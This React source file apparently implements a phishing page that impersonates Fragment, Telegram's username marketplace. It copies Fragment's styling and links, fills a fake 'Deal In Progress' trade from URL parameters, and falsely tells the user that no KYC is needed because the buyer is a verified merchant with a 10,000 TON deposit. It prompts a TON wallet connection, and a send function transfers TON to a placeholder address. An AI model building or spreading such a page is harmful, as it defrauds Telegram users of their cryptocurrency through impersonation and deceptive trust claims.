import React, { FC, useEffect, useState } from 'react';
import { useTonConnectUI, useTonWallet } from '@tonconnect/ui-react';
import { Page } from '@/components/Page.tsx';
import '@/pages/TONConnectPage/TONConnectPage.css';
import './FragmentPage.css';

export const FragmentPage: FC = () => {
  const [tonConnectUI] = useTonConnectUI();
  const wallet = useTonWallet();
  const [username, setUsername] = useState('');
  const [dealPrice, setDealPrice] = useState('');
  const [commission, setCommission] = useState('');
  const [telegramId, setTelegramId] = useState('');
  const [subscribed, setSubscribed] = useState(() => localStorage.getItem('isSubscribed') === 'true');

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const startAppParam = params.get('startapp');
    if (startAppParam) {
      const [name, deal, comm, tgId] = startAppParam.split('-');
      setUsername(name);
      setDealPrice(deal);
      setCommission(comm);
      setTelegramId(tgId);
    }

    // Optionally embed SmartSupp
    // const s = document.createElement('script');
    // s.src = 'https://www.smartsuppchat.com/loader.js?';
    // document.body.appendChild(s);
  }, []);

  const handleToggle = () => {
    const newState = !subscribed;
    setSubscribed(newState);
    localStorage.setItem('isSubscribed', newState.toString());
  };

  const usdRate = 3.367;
  const formatUSD = (ton: string) => {
    const tonValue = parseFloat(ton);
    return isNaN(tonValue) ? '' : `$${(tonValue * usdRate).toFixed(2)}`;
  };

  const handleSend = async () => {
    if (!wallet) return;
    await tonConnectUI.sendTransaction({
      validUntil: Math.floor(Date.now() / 1000) + 600,
      messages: [
        {
          address: 'EQCxxxxxxxxxxxxxxxxxxxxxxxxxxxx', // Replace with receiver address
          amount: (BigInt(dealPrice) * BigInt(1e9)).toString(), // TON to nanotons
        },
      ],
    });
  };

  return (
    <Page back>
      <div id="aj_content">
        {/* HEADER */}
        <header className="tm-header">
          <div className="tm-header-logo">
            <a href="/" className="tm-logo">
              <i className="tm-logo-icon"></i>
              <i className="tm-logo-text"></i>
            </a>
          </div>
        </header>

        {/* MAIN */}
        <main className="tm-main js-main-content">
          <section className="tm-section tm-auction-section">
            <div className="tm-section-header">
              <h2 className="tm-section-header-text">
                <span className="tm-section-header-domain">
                  <span className="tm-web3-address">
                    <span className="subdomain">monkreturn</span>
                    <span className="domain">.t.me</span>
                  </span>
                </span>
                <span className="tm-section-header-status tm-status-avail">Deal In Progress</span>
              </h2>
            </div>

            {/* Deal Info */}
            <div className="tm-section-box tm-section-bid-info">
              <table className="table tm-table tm-table-fixed">
                <thead>
                  <tr>
                    <th>Deal Price</th>
                    <th>Commission</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    {[dealPrice, commission].map((value, index) => (
                      <td key={index}>
                        <div className="table-cell table-cell-oneline table-cell-wide" style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
                          <div className="table-cell-value tm-value icon-before icon-ton">{value}</div>
                          <div className="table-cell-desc">~ {formatUSD(value)}</div>
                        </div>
                      </td>
                    ))}
                  </tr>
                </tbody>
              </table>
            </div>

            {/* Extra Info */}
            <div className="tm-list tm-section-box tm-section-auction-info">
              <dl className="tm-list-item">
                <dt>Telegram Username</dt>
                <dd><span className="accent-color">@{username}</span></dd>
              </dl>
              <dl className="tm-list-item">
                <dt>Web Address</dt>
                <dd><span className="accent-color">t.me/{username}</span></dd>
              </dl>
              <dl className="tm-list-item">
                <dt>TON Web 3.0 Address</dt>
                <dd>
                  <span className="accent-color">
                    <span className="tm-web3-address">
                      <span className="subdomain">{username}</span><span className="domain">.t.me</span>
                    </span>
                  </span>
                </dd>
              </dl>
            </div>

            {/* Connect Button */}
            <div className="tm-section-box tm-section-buttons">
              <button className="btn btn-primary" onClick={() => tonConnectUI.openModal()}>
                <span className="tm-button-label">Start Exchange</span>
              </button>
            </div>

            {/* Subscribe Toggle */}
            <div className="tm-section-subscribe tm-section-box">
              <a
  className="btn-link"
  onClick={handleToggle}
  role="button"
  style={{ cursor: 'pointer', display: 'inline-block' }}
>
  {subscribed ? 'Unsubscribe from updates' : 'Subscribe to updates'}
</a>
            </div>

            {/* Info Box */}
            <div className="tm-section-box tm-section-buttons">
              <button className="btn btn-primary js-place-bid-btn">
                <span className="tm-button-label">
                  You do not need to complete KYC verification,
                  as the buyer is a verified merchant on Fragment with a 💎10,000 deposit.
                </span>
              </button>
            </div>
          </section>

          {/* Deal Status Table */}
          <h4>Trade Info</h4>
          <div className="tm-section-box tm-section-bid-info">
            <table className="table tm-table tm-table-fixed">
              <thead>
                <tr>
                  <th>Deal Status</th>
                  <th>Username Status</th>
                  <th>Buyer</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td><div className="table-cell-value tm-value">Deal in Progress</div></td>
                  <td><div className="table-cell-desc">Swappable</div></td>
                  <td>
                    <a
                      href="https://tonviewer.com/Ef_BbsF16B4aReCFhXIOLh7qgIdLTClPvKU29ZWwLShisZ6P"
                      target="_blank"
                      rel="noopener noreferrer"
                      className="table-cell-desc"
                    >
                      Ef_BbsF16B4aReCFhXI...
                    </a>
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
        </main>

        {/* FOOTER */}
        <footer className="tm-footer">
          <div className="tm-footer-links">
            <a href="https://fragment.com/" className="tm-footer-link">Top Auctions</a>
            <a href="https://fragment.com/about" className="tm-footer-link">About</a>
            <a href="https://fragment.com/terms" className="tm-footer-link">Terms</a>
            <a href="https://fragment.com/privacy" className="tm-footer-link">Privacy</a>
          </div>
        </footer>
      </div>
    </Page>
  );
};
